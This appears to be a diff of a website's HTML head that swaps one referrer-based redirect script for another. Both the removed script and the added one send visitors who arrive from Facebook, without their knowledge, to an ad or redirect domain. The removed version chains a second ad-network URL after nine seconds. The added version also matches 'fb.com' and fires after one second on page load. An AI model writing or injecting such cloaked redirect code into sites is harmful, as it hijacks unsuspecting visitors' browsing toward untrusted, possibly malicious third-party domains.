@@ -2,26 +2,16 @@
 <html lang="en">
 <head>
 
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    // Check if visitor came from Facebook
-    if (document.referrer.includes("facebook.com")) {
-
-      // First redirect link
-      var firstLink = "//ak.stikroltiltoowi.net/4/9039697";
-      // Second redirect link
-      var secondLink = "https://www.effectivegatecpm.com/ysz18a680?key=1a72001338688b7d409faa8a8eaeba11";
-
-      // Redirect immediately to the first link
-      window.location.href = firstLink;
-
-      // After 9 seconds, redirect to the second link
-      setTimeout(function () {
-        window.location.href = secondLink;
-      }, 9000); // 9000 = 9 seconds delay
-    }
-  });
-</script>
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var referrer = document.referrer.toLowerCase();
+      if (referrer.includes("facebook.com") || referrer.includes("fb.com")) {
+        setTimeout(function () {
+          window.location.href = "//ak.stikroltiltoowi.net/4/9039697";
+        }, 1000); // 1000 ms = 1 seconds
+      }
+    });
+  </script>
 
     
     <!-- BEGIN: Powered by Supercounters.com -->
